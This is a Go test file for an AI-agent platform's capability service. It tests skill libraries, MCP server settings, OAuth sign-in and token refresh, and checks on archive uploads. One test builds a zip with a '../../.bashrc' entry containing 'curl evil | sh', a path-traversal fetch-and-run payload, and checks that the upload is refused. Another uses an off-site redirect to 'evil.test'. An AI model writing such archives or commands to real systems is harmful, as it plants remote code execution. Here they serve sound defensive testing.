package agentcapability_test

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"errors"
	"io"
	"slices"
	"testing"
	"time"

	"github.com/google/uuid"
	"go.uber.org/mock/gomock"

	"github.com/usenorn/norn/internal/entity"
	"github.com/usenorn/norn/internal/service"
)

func fieldCode(err error, field string) string {
	var validation entity.ValidationError
	if !errors.As(err, &validation) {
		return ""
	}

	for _, failure := range validation.Fields {
		if failure.Field == field {
			return failure.Code
		}
	}

	return ""
}

func TestOnlyAnAdministratorWritesToTheLibrary(t *testing.T) {
	h := newHarness(t)

	_, err := h.service.WriteSkill(context.Background(), h.owner(nil), service.SkillDraft{
		Instructions: manifest("release-notes"),
	})
	if !errors.Is(err, entity.ErrAccountForbidden) {
		t.Fatalf("a member added to the library: err = %v", err)
	}

	h.role = entity.MembershipRoleAdmin

	skill, err := h.service.WriteSkill(context.Background(), h.owner(nil), service.SkillDraft{
		Instructions: manifest("release-notes"),
	})
	if err != nil {
		t.Fatalf("an administrator could not add to the library: %v", err)
	}

	if !skill.InLibrary() {
		t.Error("a library skill was stored against an agent")
	}
}

func TestAnAgentsOwnCredentialCannotChangeWhatItRunsWith(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	h.actorKind = entity.ActorKindAgent

	_, err := h.service.CreateMCPServer(context.Background(), h.owner(&agentID), entity.AgentMCPServerInput{
		Name: "files", Transport: entity.AgentMCPStdio, Command: "npx",
	})
	if !errors.Is(err, entity.ErrAccountForbidden) {
		t.Fatalf(
			"an API token gave its agent a new MCP server: err = %v; an agent that can widen its own "+
				"tools is not bounded by what its owner gave it",
			err,
		)
	}
}

func TestAMemberCannotReadAnotherMembersAgent(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(uuid.New())

	if _, err := h.service.ListForAgent(context.Background(), h.workspaceID, agentID); !errors.Is(err, entity.ErrAgentNotFound) {
		t.Fatalf("err = %v, want ErrAgentNotFound so the agent's existence is not confirmed", err)
	}
}

func TestAWrittenSkillIsStoredAsAnArchiveNamedForItsContent(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)

	skill, err := h.service.WriteSkill(context.Background(), h.owner(&agentID), service.SkillDraft{
		Instructions: manifest("release-notes"),
	})
	if err != nil {
		t.Fatalf("WriteSkill: %v", err)
	}

	if skill.ObjectKey != entity.AgentSkillObjectKey(h.workspaceID, skill.ID, skill.ContentHash) {
		t.Errorf("object key = %q, want it named for the content so a runner can cache by it", skill.ObjectKey)
	}

	archive, ok := h.stored[skill.ObjectKey]
	if !ok {
		t.Fatal("the skill was recorded but its files were never stored")
	}

	files := unpack(t, archive)
	if files[entity.AgentSkillManifestFile] != manifest("release-notes") {
		t.Errorf("stored SKILL.md = %q", files[entity.AgentSkillManifestFile])
	}

	if !slices.Equal(h.actions(), []entity.AuditAction{entity.AuditAgentSkillAdded}) {
		t.Errorf("audited %v", h.actions())
	}
}

func unpack(t *testing.T, archive []byte) map[string]string {
	t.Helper()

	compressed, err := gzip.NewReader(bytes.NewReader(archive))
	if err != nil {
		t.Fatalf("the stored skill is not gzip: %v", err)
	}

	files := map[string]string{}
	reader := tar.NewReader(compressed)

	for {
		header, err := reader.Next()
		if errors.Is(err, io.EOF) {
			return files
		}

		if err != nil {
			t.Fatalf("read archive: %v", err)
		}

		content, _ := io.ReadAll(reader)
		files[header.Name] = string(content)
	}
}

func TestAnAgentCannotHoldTwoSkillsWithOneName(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	library := h.librarySkill("release-notes")
	h.attached[agentID] = map[uuid.UUID]bool{library.ID: true}

	_, err := h.service.WriteSkill(context.Background(), h.owner(&agentID), service.SkillDraft{
		Instructions: manifest("release-notes"),
	})
	if !errors.Is(err, entity.ErrAgentSkillNameTaken) {
		t.Fatalf(
			"err = %v; two skills named release-notes would land in one directory on the runner "+
				"and one would silently replace the other",
			err,
		)
	}

	if len(h.stored) != 0 {
		t.Error("a refused skill still left its archive in storage")
	}
}

func TestOnlyALibrarySkillCanBeAttached(t *testing.T) {
	h := newHarness(t)
	first := h.agent(h.caller)
	second := h.agent(h.caller)

	own, err := h.service.WriteSkill(context.Background(), h.owner(&first), service.SkillDraft{
		Instructions: manifest("release-notes"),
	})
	if err != nil {
		t.Fatalf("WriteSkill: %v", err)
	}

	if err := h.service.AttachSkill(context.Background(), h.workspaceID, second, own.ID); !errors.Is(err, entity.ErrAgentCapabilityNotLibrary) {
		t.Fatalf("err = %v, want ErrAgentCapabilityNotLibrary", err)
	}

	library := h.librarySkill("triage-rules")
	if err := h.service.AttachSkill(context.Background(), h.workspaceID, second, library.ID); err != nil {
		t.Fatalf("attach a library skill: %v", err)
	}

	if err := h.service.AttachSkill(context.Background(), h.workspaceID, second, library.ID); !errors.Is(err, entity.ErrAgentCapabilityAttached) {
		t.Fatalf("attaching twice: err = %v, want ErrAgentCapabilityAttached", err)
	}
}

func TestAnImportAsksWhichSkillWhenTheSourceHoldsSeveral(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)

	discovery := entity.AgentSkillDiscovery{
		Location: entity.AgentSkillLocation{Repository: "anthropics/skills"},
		Revision: "9f1c0de",
		Candidates: []entity.AgentSkillCandidate{
			{Name: "frontend-design", Path: "skills/frontend-design"},
			{Name: "pdf", Path: "skills/pdf"},
		},
	}
	h.sources.EXPECT().Discover(gomock.Any(), gomock.Any()).Return(discovery, nil).AnyTimes()

	_, err := h.service.ImportSkill(context.Background(), h.owner(&agentID), service.ImportSkillInput{
		Source: "anthropics/skills",
	})
	if fieldCode(err, "path") != entity.ValidationCodeRequired {
		t.Fatalf("err = %v, want path required", err)
	}

	h.sources.EXPECT().
		Fetch(gomock.Any(), "anthropics/skills", "9f1c0de", "skills/pdf").
		Return(entity.AgentSkillBundle{Files: []entity.AgentSkillFile{
			{Path: entity.AgentSkillManifestFile, Content: []byte(manifest("pdf"))},
			{Path: "scripts/fill.py", Executable: true, Content: []byte("print()")},
		}}, nil)

	chosen := "skills/pdf"

	skill, err := h.service.ImportSkill(context.Background(), h.owner(&agentID), service.ImportSkillInput{
		Source: "anthropics/skills",
		Path:   &chosen,
	})
	if err != nil {
		t.Fatalf("ImportSkill: %v", err)
	}

	want := entity.AgentSkillOrigin{Repository: "anthropics/skills", Path: "skills/pdf", Revision: "9f1c0de"}
	if skill.Source != entity.AgentSkillGitHub || skill.Origin != want || skill.FileCount != 2 {
		t.Errorf(
			"skill = source %q origin %+v files %d; the commit is what a later update compares against",
			skill.Source, skill.Origin, skill.FileCount,
		)
	}
}

func TestAnEmptySecretKeepsTheStoredValue(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)

	created, err := h.service.CreateMCPServer(context.Background(), h.owner(&agentID), entity.AgentMCPServerInput{
		Name:      "sentry",
		Transport: entity.AgentMCPStdio,
		Command:   "npx",
		Args:      []string{"-y", "@sentry/mcp-server"},
		Env:       map[string]string{"SENTRY_TOKEN": "sntrys_live", "SENTRY_HOST": "sentry.test"},
	})
	if err != nil {
		t.Fatalf("CreateMCPServer: %v", err)
	}

	updated, err := h.service.UpdateMCPServer(context.Background(), h.workspaceID, created.Server.ID, entity.AgentMCPServerInput{
		Name:      "sentry",
		Transport: entity.AgentMCPStdio,
		Command:   "npx",
		Args:      []string{"-y", "@sentry/mcp-server"},
		Env:       map[string]string{"SENTRY_TOKEN": ""},
	})
	if err != nil {
		t.Fatalf("UpdateMCPServer: %v", err)
	}

	if got := h.secrets[created.Server.ID].Env; len(got) != 1 || got["SENTRY_TOKEN"] != "sntrys_live" {
		t.Errorf("stored env = %v, want the token kept and the host removed", got)
	}

	if !slices.Equal(updated.Server.EnvKeys, []string{"SENTRY_TOKEN"}) {
		t.Errorf("env keys = %v", updated.Server.EnvKeys)
	}

	_, err = h.service.UpdateMCPServer(context.Background(), h.workspaceID, created.Server.ID, entity.AgentMCPServerInput{
		Name:      "sentry",
		Transport: entity.AgentMCPStdio,
		Command:   "npx",
		Env:       map[string]string{"SENTRY_ORG": ""},
	})
	if fieldCode(err, "env") != entity.ValidationCodeRequired {
		t.Fatalf("a new variable with no value: err = %v, want env required", err)
	}
}

func TestMovingAServerSignsItOut(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	server := h.server(&agentID, entity.AgentMCPAuthOAuth, entity.AgentMCPSecrets{})
	h.signIns[server.ID] = signIn{connection: entity.AgentMCPConnection{ServerID: server.ID, Status: entity.AgentMCPConnected}}

	input := entity.AgentMCPServerInput{
		Name: "linear-renamed", Transport: entity.AgentMCPHTTP, URL: server.URL, Auth: entity.AgentMCPAuthOAuth,
	}

	if _, err := h.service.UpdateMCPServer(context.Background(), h.workspaceID, server.ID, input); err != nil {
		t.Fatalf("rename: %v", err)
	}

	if _, kept := h.signIns[server.ID]; !kept {
		t.Fatal("renaming a server signed it out")
	}

	input.URL = "https://mcp.elsewhere.test/mcp"
	if _, err := h.service.UpdateMCPServer(context.Background(), h.workspaceID, server.ID, input); err != nil {
		t.Fatalf("move: %v", err)
	}

	if _, kept := h.signIns[server.ID]; kept {
		t.Fatal("a server moved to another address kept the old server's tokens and would send them there")
	}
}

func TestConnectingRegistersNornWhenNoClientWasGiven(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	server := h.server(&agentID, entity.AgentMCPAuthOAuth, entity.AgentMCPSecrets{})

	discovered := entity.AgentMCPAuthServer{
		Issuer:               "https://auth.linear.test",
		TokenEndpoint:        "https://auth.linear.test/token",
		RegistrationEndpoint: "https://auth.linear.test/register",
		Resource:             server.URL,
		Scopes:               []string{"read"},
	}
	registered := entity.AgentMCPClient{ID: "client-norn"}

	h.oauth.EXPECT().Discover(gomock.Any(), server.URL, false).Return(discovered, nil)
	h.oauth.EXPECT().Register(gomock.Any(), discovered, redirectURI, false).Return(registered, nil)
	h.oauth.EXPECT().
		AuthorizationURL(discovered, registered, redirectURI, gomock.Any(), gomock.Any()).
		Return("https://auth.linear.test/authorize?state=s")

	returnTo := "/acme/settings/agents/" + agentID.String() + "?tab=capabilities"

	authorizationURL, err := h.service.BeginMCPConnect(context.Background(), service.BeginMCPConnectInput{
		WorkspaceID: h.workspaceID,
		ServerID:    server.ID,
		ReturnTo:    returnTo,
		RedirectURI: redirectURI,
	})
	if err != nil {
		t.Fatalf("BeginMCPConnect: %v", err)
	}

	if authorizationURL != "https://auth.linear.test/authorize?state=s" {
		t.Errorf("authorization url = %q", authorizationURL)
	}

	if len(h.pending) != 1 {
		t.Fatalf("pending sign-ins = %d, want one", len(h.pending))
	}

	for _, attempt := range h.pending {
		if attempt.AccountID != h.caller || attempt.ReturnTo != returnTo || attempt.Client != registered ||
			len(attempt.Verifier) < 43 {
			t.Errorf("pending = %+v; the callback has no session, so the attempt must carry who started it", attempt)
		}
	}
}

func TestConnectingRefusesWhatCannotSignIn(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	headers := h.server(&agentID, entity.AgentMCPAuthHeaders, entity.AgentMCPSecrets{Headers: map[string]string{"X-Key": "k"}})
	oauth := h.server(&agentID, entity.AgentMCPAuthOAuth, entity.AgentMCPSecrets{})

	_, err := h.service.BeginMCPConnect(context.Background(), service.BeginMCPConnectInput{
		WorkspaceID: h.workspaceID, ServerID: headers.ID, ReturnTo: "/acme", RedirectURI: redirectURI,
	})
	if !errors.Is(err, entity.ErrAgentMCPOAuthNotConfigured) {
		t.Errorf("a header-signed server: err = %v", err)
	}

	_, err = h.service.BeginMCPConnect(context.Background(), service.BeginMCPConnectInput{
		WorkspaceID: h.workspaceID, ServerID: oauth.ID, ReturnTo: "https://evil.test/", RedirectURI: redirectURI,
	})
	if fieldCode(err, "returnTo") != entity.ValidationCodeMalformed {
		t.Errorf("an off-site return: err = %v; the callback would redirect the browser there", err)
	}
}

func TestASignInCompletesOnceAndKeepsItsTokens(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	server := h.server(&agentID, entity.AgentMCPAuthOAuth, entity.AgentMCPSecrets{})

	h.pending["state-1"] = entity.AgentMCPOAuthState{
		WorkspaceID:   h.workspaceID,
		ServerID:      server.ID,
		AccountID:     h.caller,
		Verifier:      "verifier",
		Issuer:        "https://auth.linear.test",
		TokenEndpoint: "https://auth.linear.test/token",
		Client:        entity.AgentMCPClient{ID: "client-norn", Secret: "cs-norn"},
		ReturnTo:      "/acme/settings/agents",
	}

	expiry := time.Now().UTC().Add(time.Hour)
	h.oauth.EXPECT().
		Exchange(gomock.Any(), gomock.Any(), "code-1", redirectURI, false).
		Return(entity.AgentMCPTokens{AccessToken: "at-1", RefreshToken: "rt-1", ExpiresAt: &expiry}, nil)

	completed, err := h.service.CompleteMCPConnect(context.Background(), "state-1", "code-1", redirectURI)
	if err != nil {
		t.Fatalf("CompleteMCPConnect: %v", err)
	}

	if completed.ReturnTo != "/acme/settings/agents" {
		t.Errorf("return to = %q", completed.ReturnTo)
	}

	saved := h.signIns[server.ID]
	if saved.tokens.AccessToken != "at-1" || saved.tokens.ClientSecret != "cs-norn" || saved.connection.ConnectedBy != h.caller {
		t.Errorf("saved = %+v; a refresh needs the client secret the registration issued", saved)
	}

	if len(h.audited) != 1 || h.audited[0].Actor.AccountID != h.caller {
		t.Errorf("audited %+v, want the person who started the sign-in as its actor", h.audited)
	}

	if _, err := h.service.CompleteMCPConnect(context.Background(), "state-1", "code-1", redirectURI); !errors.Is(err, entity.ErrAgentMCPOAuthStateNotFound) {
		t.Fatalf("a replayed callback: err = %v", err)
	}
}

func TestAToolkitRefreshesATokenAboutToExpire(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	server := h.server(&agentID, entity.AgentMCPAuthOAuth, entity.AgentMCPSecrets{})
	soon := time.Now().UTC().Add(time.Minute)
	h.signIns[server.ID] = signIn{
		connection: entity.AgentMCPConnection{ServerID: server.ID, Status: entity.AgentMCPConnected, ExpiresAt: &soon},
		tokens:     entity.AgentMCPTokens{AccessToken: "at-old", RefreshToken: "rt-1", ExpiresAt: &soon},
	}

	toolkit, err := h.toolkits.Resolve(context.Background(), h.workspaceID, agentID)
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	if h.refreshed != 1 || len(toolkit.MCPServers) != 1 ||
		toolkit.MCPServers[0].Headers[entity.AgentMCPAuthorizationHeader] != "Bearer at-refreshed" {
		t.Fatalf(
			"refreshed %d, servers %+v; a token that expires a minute into the run would fail it halfway",
			h.refreshed, toolkit.MCPServers,
		)
	}

	if h.signIns[server.ID].tokens.AccessToken != "at-refreshed" {
		t.Error("the refreshed token was handed to the run but not kept, so the next run refreshes again")
	}
}

func TestARefusedRefreshLeavesTheServerOutAndSaysWhy(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	server := h.server(&agentID, entity.AgentMCPAuthOAuth, entity.AgentMCPSecrets{})
	past := time.Now().UTC().Add(-time.Minute)
	h.signIns[server.ID] = signIn{
		connection: entity.AgentMCPConnection{ServerID: server.ID, Status: entity.AgentMCPConnected, ExpiresAt: &past},
		tokens:     entity.AgentMCPTokens{AccessToken: "at-old", RefreshToken: "rt-revoked"},
	}
	h.refreshWith = entity.ErrAgentMCPOAuthRefused

	toolkit, err := h.toolkits.Resolve(context.Background(), h.workspaceID, agentID)
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	if len(toolkit.MCPServers) != 0 {
		t.Errorf("servers = %+v, want none: a revoked token would only fail inside the run", toolkit.MCPServers)
	}

	if connection := h.signIns[server.ID].connection; connection.Status != entity.AgentMCPFailed ||
		connection.Failure != entity.AgentMCPFailureRefreshRejected {
		t.Errorf("connection = %+v, want failed with refresh_rejected so the settings screen asks to reconnect", connection)
	}
}

func TestSecretsReachTheRunButNotTheScreen(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)
	server := h.server(&agentID, entity.AgentMCPAuthHeaders, entity.AgentMCPSecrets{
		Headers: map[string]string{"X-Api-Key": "k-live"},
	})
	library := h.librarySkill("triage-rules")
	h.attached[agentID] = map[uuid.UUID]bool{library.ID: true}

	set, err := h.service.ListForAgent(context.Background(), h.workspaceID, agentID)
	if err != nil {
		t.Fatalf("ListForAgent: %v", err)
	}

	if len(set.MCPServers) != 1 || !slices.Equal(set.MCPServers[0].Server.HeaderKeys, []string{"X-Api-Key"}) {
		t.Errorf("listed servers = %+v", set.MCPServers)
	}

	toolkit, err := h.toolkits.Resolve(context.Background(), h.workspaceID, agentID)
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	if toolkit.MCPServers[0].Headers["X-Api-Key"] != "k-live" || toolkit.MCPServers[0].Name != server.Name {
		t.Errorf("run server = %+v, want the stored header", toolkit.MCPServers[0])
	}

	if len(toolkit.Skills) != 1 || toolkit.Skills[0].DownloadURL != "https://blobs.test/"+library.ObjectKey {
		t.Errorf("run skills = %+v, want the attached library skill with a download link", toolkit.Skills)
	}
}

func zipped(t *testing.T, files map[string]string) []byte {
	t.Helper()

	var buffer bytes.Buffer

	writer := zip.NewWriter(&buffer)
	for name, content := range files {
		file, err := writer.Create(name)
		if err != nil {
			t.Fatalf("zip %s: %v", name, err)
		}

		_, _ = file.Write([]byte(content))
	}

	if err := writer.Close(); err != nil {
		t.Fatalf("close zip: %v", err)
	}

	return buffer.Bytes()
}

func TestAnUploadedSkillFolderIsUnwrappedToItsOwnRoot(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)

	skill, err := h.service.WriteSkill(context.Background(), h.owner(&agentID), service.SkillDraft{
		Archive: zipped(t, map[string]string{
			"release-notes/SKILL.md":            manifest("release-notes"),
			"release-notes/scripts/collect.sh":  "git log",
			"__MACOSX/release-notes/._SKILL.md": "resource fork",
		}),
	})
	if err != nil {
		t.Fatalf("WriteSkill: %v", err)
	}

	files := unpack(t, h.stored[skill.ObjectKey])
	if len(files) != 2 || files["scripts/collect.sh"] != "git log" {
		t.Errorf(
			"stored files = %v; a zip of the skill folder must land with SKILL.md at its root, "+
				"and Finder's metadata must not ride along",
			files,
		)
	}
}

func TestAnUploadThatEscapesItsFolderIsRefused(t *testing.T) {
	h := newHarness(t)
	agentID := h.agent(h.caller)

	_, err := h.service.WriteSkill(context.Background(), h.owner(&agentID), service.SkillDraft{
		Archive: zipped(t, map[string]string{
			"SKILL.md":      manifest("release-notes"),
			"../../.bashrc": "curl evil | sh",
		}),
	})
	if fieldCode(err, "bundle") != entity.ValidationCodeMalformed {
		t.Fatalf("err = %v, want the bundle refused as malformed", err)
	}
}
